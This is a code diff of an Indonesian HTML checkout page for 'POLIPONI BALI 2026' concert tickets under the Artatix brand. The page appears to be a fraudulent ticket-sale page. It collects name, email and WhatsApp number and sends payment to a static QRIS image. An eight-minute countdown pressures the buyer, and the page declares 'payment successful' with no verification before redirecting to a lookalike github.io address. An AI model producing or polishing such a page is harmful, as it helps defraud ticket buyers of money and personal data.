@@ -4,71 +4,131 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 
-<title>Checkout Ticket - Poliponi 2026</title>
+<title>POLIPONI BALI 2026 - Checkout</title>
 
 <style>
-
 *{
 margin:0;
 padding:0;
 box-sizing:border-box;
-font-family:Arial, Helvetica, sans-serif;
+font-family:Arial,Helvetica,sans-serif;
 }
 
 body{
-background:#f4f7fb;
+background:#f4f6fb;
 color:#111827;
 }
 
-/* CONTAINER */
-.wrapper{
-width:100%;
-max-width:1300px;
-margin:auto;
-padding:30px 20px;
-}
-
 /* HEADER */
-.top-header{
+
+.header{
+background:#fff;
+padding:18px 24px;
 display:flex;
 justify-content:space-between;
 align-items:center;
-margin-bottom:35px;
-flex-wrap:wrap;
-gap:15px;
+box-shadow:0 2px 10px rgba(0,0,0,.05);
+position:sticky;
+top:0;
+z-index:100;
 }
 
 .logo{
-font-size:34px;
+font-size:28px;
 font-weight:800;
-color:#356dff;
+color:#2443ff;
 }
 
 .secure{
-font-size:15px;
-color:#6b7280;
+font-size:14px;
+color:#555;
 }
 
-/* MAIN GRID */
-.checkout-grid{
+/* MAIN */
+
+.container{
+max-width:1200px;
+margin:auto;
+padding:30px 20px;
 display:grid;
-grid-template-columns:1.1fr 0.8fr;
-gap:30px;
-align-items:start;
+grid-template-columns:1.2fr .8fr;
+gap:28px;
 }
 
-/* CARD */
-.card{
-background:#fff;
-border-radius:28px;
-padding:30px;
-box-shadow:
-0 10px 30px rgba(0,0,0,0.05);
+/* MOBILE */
+
+@media(max-width:900px){
+.container{
+grid-template-columns:1fr;
+}
 }
 
 /* LEFT */
-.title{
-font-size:42px;
+
+.left{
+background:#fff;
+padding:30px;
+border-radius:22px;
+box-shadow:0 5px 20px rgba(0,0,0,.06);
+}
+
+/* STEP */
+
+.steps{
+display:flex;
+align-items:center;
+justify-content:space-between;
+margin:25px 0 40px;
+}
+
+.step{
+flex:1;
+text-align:center;
+position:relative;
+}
+
+.step .circle{
+width:42px;
+height:42px;
+border-radius:50%;
+background:#dfe5ff;
+color:#2443ff;
+display:flex;
+align-items:center;
+justify-content:center;
+font-weight:bold;
+margin:auto;
+}
+
+.step.active .circle{
+background:#2443ff;
+color:#fff;
+}
+
+.step p{
+font-size:14px;
+margin-top:8px;
+}
+
+.step::after{
+content:"";
+position:absolute;
+height:3px;
+background:#dbe1ff;
+top:20px;
+left:60%;
+width:80%;
+z-index:-1;
+}
+
+.step:last-child::after{
+display:none;
+}
+
+/* FORM */
+
+.section-title{
+font-size:30px;
 font-weight:800;
 margin-bottom:10px;
 }
@@ -76,227 +136,207 @@ margin-bottom:10px;
 .subtitle{
 color:#6b7280;
 margin-bottom:30px;
-line-height:1.6;
+}
+
+.form-group{
+margin-bottom:20px;
+}
+
+label{
+display:block;
+margin-bottom:8px;
+font-weight:600;
+}
+
+input, textarea, select{
+width:100%;
+padding:16px;
+border-radius:14px;
+border:1px solid #d1d5db;
+font-size:15px;
+outline:none;
+transition:.2s;
+}
+
+input:focus,
+textarea:focus,
+select:focus{
+border-color:#2443ff;
+}
+
+textarea{
+resize:none;
+height:100px;
+}
+
+/* TICKET */
+
+.ticket-grid{
+display:grid;
+grid-template-columns:1fr;
+gap:15px;
+margin-bottom:30px;
+}
+
+.ticket{
+border:2px solid #e5e7eb;
+padding:18px;
+border-radius:18px;
+cursor:pointer;
+transition:.25s;
+background:#fff;
+}
+
+.ticket:hover{
+border-color:#2443ff;
+transform:translateY(-2px);
+}
+
+.ticket.active{
+border-color:#2443ff;
+background:#f3f6ff;
+}
+
+.ticket h3{
+font-size:18px;
+margin-bottom:8px;
+}
+
+.ticket p{
+font-size:14px;
+color:#555;
+}
+
+.price{
+font-size:22px;
+font-weight:800;
+margin-top:10px;
+color:#111827;
+}
+
+/* PAYMENT */
+
+.payment-box{
+border:2px dashed #2443ff;
+border-radius:20px;
+padding:20px;
+text-align:center;
+margin-top:20px;
+background:#f9fbff;
+}
+
+.qris{
+width:100%;
+max-width:260px;
+border-radius:14px;
+margin:15px auto;
+display:block;
 }
 
 /* TIMER */
-.timer-box{
-background:#fff5f5;
-border:1px solid #ffd6d6;
-padding:18px;
-border-radius:20px;
-margin-bottom:30px;
-display:flex;
-justify-content:space-between;
-align-items:center;
-flex-wrap:wrap;
-gap:10px;
-}
-
-.timer-label{
-font-weight:700;
-color:#dc2626;
-}
 
 .timer{
 font-size:28px;
 font-weight:800;
-color:#dc2626;
+color:#ef4444;
+margin-top:10px;
 }
 
-/* INPUT */
-.form-group{
-margin-bottom:22px;
-}
+/* BUTTON */
 
-.form-group label{
-display:block;
-margin-bottom:10px;
-font-weight:700;
-font-size:15px;
-}
-
-.form-group input,
-.form-group textarea{
+.btn{
 width:100%;
 padding:18px;
-border-radius:18px;
-border:1px solid #dbe3ef;
-font-size:16px;
-outline:none;
-transition:0.2s;
+border:none;
+border-radius:16px;
+background:#2443ff;
+color:#fff;
+font-size:18px;
+font-weight:700;
+cursor:pointer;
+transition:.2s;
+margin-top:25px;
+}
+
+.btn:hover{
+opacity:.92;
+}
+
+.btn:disabled{
+background:#9ca3af;
+cursor:not-allowed;
+}
+
+/* RIGHT */
+
+.right{
 background:#fff;
-}
-
-.form-group input:focus,
-.form-group textarea:focus{
-border-color:#356dff;
-box-shadow:0 0 0 4px rgba(53,109,255,0.12);
-}
-
-/* QRIS */
-.qris-box{
-background:#f8fbff;
-border:1px solid #dbe8ff;
-border-radius:24px;
-padding:25px;
-margin-top:10px;
-text-align:center;
-}
-
-.qris-title{
-font-size:22px;
-font-weight:800;
-margin-bottom:18px;
-}
-
-.qris-box img{
-width:100%;
-max-width:300px;
-border-radius:18px;
-box-shadow:0 8px 20px rgba(0,0,0,0.08);
-}
-
-/* FILE */
-.upload-box{
-border:2px dashed #b8c7e7;
-padding:25px;
+padding:30px;
 border-radius:22px;
-text-align:center;
-background:#f8fbff;
-}
-
-.upload-box input{
-margin-top:15px;
-}
-
-/* RIGHT SIDE */
-.summary-title{
-font-size:28px;
-font-weight:800;
-margin-bottom:25px;
+box-shadow:0 5px 20px rgba(0,0,0,.06);
+height:fit-content;
+position:sticky;
+top:100px;
 }
 
 .banner{
 width:100%;
-border-radius:24px;
-overflow:hidden;
+border-radius:20px;
 margin-bottom:25px;
 }
 
-.banner img{
-width:100%;
-display:block;
+.summary-title{
+font-size:26px;
+font-weight:800;
+margin-bottom:20px;
 }
 
-.ticket-item{
+.summary-item{
 display:flex;
 justify-content:space-between;
-margin-bottom:18px;
-gap:10px;
-}
-
-.ticket-name{
-font-weight:700;
-line-height:1.5;
-}
-
-.ticket-price{
-font-weight:800;
-}
-
-.line{
-height:1px;
-background:#e9eef7;
-margin:25px 0;
+margin-bottom:14px;
+font-size:15px;
 }
 
 .total{
+margin-top:25px;
+padding-top:20px;
+border-top:2px dashed #ddd;
 display:flex;
 justify-content:space-between;
-align-items:center;
-margin-bottom:25px;
-}
-
-.total h2{
-font-size:18px;
-}
-
-.total-price{
-font-size:34px;
-font-weight:900;
-color:#356dff;
-}
-
-/* BUTTON */
-.pay-btn{
-width:100%;
-border:none;
-padding:20px;
-border-radius:22px;
-font-size:18px;
-font-weight:800;
-cursor:pointer;
-transition:0.25s;
-background:#cfd8ff;
-color:#fff;
-pointer-events:none;
-}
-
-.pay-btn.active{
-background:#356dff;
-pointer-events:auto;
-box-shadow:0 10px 25px rgba(53,109,255,0.3);
-}
-
-.pay-btn.active:hover{
-transform:translateY(-2px);
-}
-
-/* MOBILE */
-@media(max-width:980px){
-
-.checkout-grid{
-grid-template-columns:1fr;
-}
-
-.title{
-font-size:34px;
-}
-
-.card{
-padding:24px;
-}
-
-.total-price{
-font-size:28px;
-}
-
-}
-
-@media(max-width:600px){
-
-.wrapper{
-padding:18px;
-}
-
-.title{
-font-size:30px;
-}
-
-.logo{
-font-size:28px;
-}
-
-.timer{
 font-size:24px;
+font-weight:800;
+color:#2443ff;
 }
 
-.pay-btn{
-font-size:16px;
-padding:18px;
+/* SUCCESS */
+
+.success{
+display:none;
+text-align:center;
+padding:50px 20px;
 }
 
+.success h1{
+font-size:40px;
+margin-bottom:15px;
+color:#16a34a;
+}
+
+.success p{
+font-size:18px;
+color:#555;
+margin-bottom:30px;
+}
+
+/* FOOTER */
+
+.footer{
+margin-top:40px;
+padding:30px;
+text-align:center;
+font-size:14px;
+color:#6b7280;
 }
 
 </style>
@@ -304,44 +344,41 @@ padding:18px;
 
 <body>
 
-<div class="wrapper">
-
 <!-- HEADER -->
-<div class="top-header">
-<div class="logo">
-Artatix
+
+<div class="header">
+<div class="logo">Artatix</div>
+<div class="secure">🔒 Transaksi Aman & Terpercaya</div>
 </div>
 
-<div class="secure">
-🔒 Transaksi Aman & Terpercaya
-</div>
-</div>
+<!-- MAIN -->
 
-<!-- GRID -->
-<div class="checkout-grid">
+<div class="container" id="mainCheckout">
 
 <!-- LEFT -->
-<div class="card">
 
-<h1 class="title">
-Checkout
-</h1>
+<div class="left">
 
-<div class="subtitle">
-Lengkapi data dan lakukan pembayaran untuk melanjutkan pemesanan ticket event.
+<h1 class="section-title">Checkout</h1>
+<p class="subtitle">Lengkapi data dan lakukan pembayaran untuk melanjutkan.</p>
+
+<!-- STEP -->
+
+<div class="steps">
+<div class="step active">
+<div class="circle">1</div>
+<p>Data Pembeli</p>
 </div>
 
-<!-- TIMER -->
-<div class="timer-box">
-
-<div class="timer-label">
-Waktu Pembayaran
+<div class="step active">
+<div class="circle">2</div>
+<p>Pembayaran</p>
 </div>
 
-<div class="timer" id="countdown">
-08:00
+<div class="step active">
+<div class="circle">3</div>
+<p>Selesai</p>
 </div>
-
 </div>
 
 <!-- FORM -->
@@ -358,192 +395,228 @@ Waktu Pembayaran
 
 <div class="form-group">
 <label>Nomor WhatsApp *</label>
-<input type="tel" id="wa" placeholder="08xxxxxxxxxx">
+<input type="number" id="wa" placeholder="08xxxxxxxxxx">
 </div>
 
-<div class="form-group">
-<label>Alamat *</label>
-<textarea rows="4" id="alamat" placeholder="Masukkan alamat lengkap"></textarea>
+<!-- TIKET -->
+
+<h2 style="margin:30px 0 18px;">Kategori Tiket</h2>
+
+<div class="ticket-grid">
+
+<div class="ticket active" onclick="selectTicket(this,'Festival','1900000')">
+<h3>Paket 4 Orang : Festival</h3>
+<p>ON SALE</p>
+<div class="price">Rp 1.900.000</div>
 </div>
 
-<!-- QRIS -->
-<div class="qris-box">
-
-<div class="qris-title">
-Pembayaran QRIS
+<div class="ticket" onclick="selectTicket(this,'Premium','2900000')">
+<h3>Paket 4 Orang : Premium</h3>
+<p>ON SALE</p>
+<div class="price">Rp 2.900.000</div>
 </div>
 
-<img src="qris-pembayaran.png" alt="QRIS Pembayaran">
+<div class="ticket" onclick="selectTicket(this,'Fast Track','3900000')">
+<h3>Paket 4 Orang : Fast Track</h3>
+<p>ON SALE</p>
+<div class="price">Rp 3.900.000</div>
+</div>
 
 </div>
 
-<br>
+<!-- PAYMENT -->
 
-<!-- UPLOAD -->
-<div class="upload-box">
+<div class="payment-box">
 
-<div style="font-size:20px;font-weight:800;margin-bottom:10px;">
-Upload Bukti Pembayaran *
-</div>
+<h2>Pembayaran QRIS</h2>
 
-<div style="color:#6b7280;">
-Upload screenshot / bukti transfer pembayaran
-</div>
+<p style="margin-top:8px;color:#666;">
+Selesaikan pembayaran sebelum waktu habis
+</p>
 
+<div class="timer" id="timer">08:00</div>
+
+<img src="qris-pembayaran.png" class="qris">
+
+<div class="form-group" style="margin-top:20px;">
+<label>Upload Bukti Pembayaran *</label>
 <input type="file" id="bukti" accept="image/*">
+</div>
 
 </div>
 
-<br><br>
-
-<button class="pay-btn" id="payBtn">
+<button class="btn" id="buyBtn" disabled>
 Beli Sekarang
 </button>
 
 </div>
 
 <!-- RIGHT -->
-<div class="card">
+
+<div class="right">
+
+<img src="banner-deskripsi.png" class="banner">
 
 <div class="summary-title">
 Ringkasan Pesanan
 </div>
 
-<div class="banner">
-<img src="banner-deskripsi.png">
+<div class="summary-item">
+<span>Event</span>
+<span>POLIPONI BALI 2026</span>
 </div>
 
-<div class="ticket-item">
-<div class="ticket-name">
-Paket 4 Orang : Festival
+<div class="summary-item">
+<span>Tanggal</span>
+<span>04.07.2026</span>
 </div>
 
-<div class="ticket-price">
-Rp 1.900.000
-</div>
-</div>
-
-<div class="ticket-item">
-<div class="ticket-name">
-Biaya Layanan
+<div class="summary-item">
+<span>Lokasi</span>
+<span>Bali United Training Center</span>
 </div>
 
-<div class="ticket-price">
-Rp 50.000
-</div>
+<div class="summary-item">
+<span>Guest Star</span>
+<span>Sheila On 7</span>
 </div>
 
-<div class="line"></div>
+<hr style="margin:20px 0; border:none; border-top:1px solid #e5e7eb;">
+
+<div class="summary-item">
+<span id="ticketName">Festival</span>
+<span id="ticketPrice">Rp 1.900.000</span>
+</div>
 
 <div class="total">
-
-<h2>Total Pembayaran</h2>
-
-<div class="total-price">
-Rp 1.950.000
-</div>
-
-</div>
-
-<div style="
-background:#f8fbff;
-padding:22px;
-border-radius:20px;
-line-height:1.8;
-color:#4b5563;
-">
-
-✅ E-Ticket akan dikirim otomatis setelah verifikasi pembayaran berhasil.<br><br>
-
-✅ Pastikan bukti transfer terlihat jelas dan tidak blur.<br><br>
-
-✅ Pembayaran aman & terenkripsi.
-
+<span>Total</span>
+<span id="totalPrice">Rp 1.900.000</span>
 </div>
 
 </div>
 
 </div>
 
+<!-- SUCCESS -->
+
+<div class="success" id="successPage">
+
+<h1>✓ Pembayaran Berhasil</h1>
+
+<p>
+Terima kasih telah melakukan pembelian tiket POLIPONI BALI 2026
+</p>
+
+<button class="btn" onclick="goThanks()">
+Lanjutkan
+</button>
+
+</div>
+
+<!-- FOOTER -->
+
+<div class="footer">
+© 2026 POLIPONI BALI — Ticketing Partner by Artatix
 </div>
 
 <script>
 
-/* COUNTDOWN */
-let time = 8 * 60;
+let selectedPrice = 1900000;
 
-const countdown = document.getElementById('countdown');
+function rupiah(num){
+return "Rp " + num.toString().replace(/\B(?=(\d{3})+(?!\d))/g,".");
+}
 
-const timer = setInterval(() => {
+function selectTicket(el,name,price){
+
+document.querySelectorAll('.ticket').forEach(t=>{
+t.classList.remove('active');
+});
+
+el.classList.add('active');
+
+selectedPrice = parseInt(price);
+
+document.getElementById('ticketName').innerText = name;
+document.getElementById('ticketPrice').innerText = rupiah(selectedPrice);
+document.getElementById('totalPrice').innerText = rupiah(selectedPrice);
+
+checkForm();
+
+}
+
+const nama = document.getElementById('nama');
+const email = document.getElementById('email');
+const wa = document.getElementById('wa');
+const bukti = document.getElementById('bukti');
+const buyBtn = document.getElementById('buyBtn');
+
+function checkForm(){
+
+if(
+nama.value.trim() !== "" &&
+email.value.trim() !== "" &&
+wa.value.trim() !== "" &&
+bukti.files.length > 0
+){
+buyBtn.disabled = false;
+}else{
+buyBtn.disabled = true;
+}
+
+}
+
+nama.addEventListener('input',checkForm);
+email.addEventListener('input',checkForm);
+wa.addEventListener('input',checkForm);
+bukti.addEventListener('change',checkForm);
+
+buyBtn.addEventListener('click',()=>{
+
+document.getElementById('mainCheckout').style.display = "none";
+document.getElementById('successPage').style.display = "block";
+
+setTimeout(()=>{
+window.location.href = "https://poliponii2026.github.io/THANKS-YOU-/";
+},2500);
+
+});
+
+/* TIMER */
+
+let time = 480;
+
+const timer = document.getElementById('timer');
+
+const countdown = setInterval(()=>{
 
 let minutes = Math.floor(time / 60);
 let seconds = time % 60;
 
-minutes = minutes < 10 ? '0' + minutes : minutes;
-seconds = seconds < 10 ? '0' + seconds : seconds;
+minutes = minutes < 10 ? "0"+minutes : minutes;
+seconds = seconds < 10 ? "0"+seconds : seconds;
 
-countdown.innerHTML = `${minutes}:${seconds}`;
+timer.innerText = `${minutes}:${seconds}`;
+
+if(time <= 0){
+
+clearInterval(countdown);
+
+timer.innerText = "WAKTU HABIS";
+
+buyBtn.disabled = true;
+
+alert("Waktu pembayaran habis");
+
+}
 
 time--;
 
-if(time < 0){
+},1000);
 
-clearInterval(timer);
-
-countdown.innerHTML = "EXPIRED";
-
-document.getElementById('payBtn').disabled = true;
-
-document.getElementById('payBtn').classList.remove('active');
-
+function goThanks(){
+window.location.href = "https://poliponii2026.github.io/THANKS-YOU-/";
 }
-
-}, 1000);
-
-/* VALIDATION */
-const nama = document.getElementById('nama');
-const email = document.getElementById('email');
-const wa = document.getElementById('wa');
-const alamat = document.getElementById('alamat');
-const bukti = document.getElementById('bukti');
-const payBtn = document.getElementById('payBtn');
-
-function validateForm(){
-
-if(
-nama.value.trim() !== '' &&
-email.value.trim() !== '' &&
-wa.value.trim() !== '' &&
-alamat.value.trim() !== '' &&
-bukti.files.length > 0
-){
-
-payBtn.classList.add('active');
-
-}else{
-
-payBtn.classList.remove('active');
-
-}
-
-}
-
-nama.addEventListener('input', validateForm);
-email.addEventListener('input', validateForm);
-wa.addEventListener('input', validateForm);
-alamat.addEventListener('input', validateForm);
-bukti.addEventListener('change', validateForm);
-
-/* REDIRECT */
-payBtn.addEventListener('click', function(){
-
-if(payBtn.classList.contains('active')){
-
-window.location.href = 'https://poliponii2026.github.io/THANKS-YOU-/';
-
-}
-
-});
 
 </script>
 
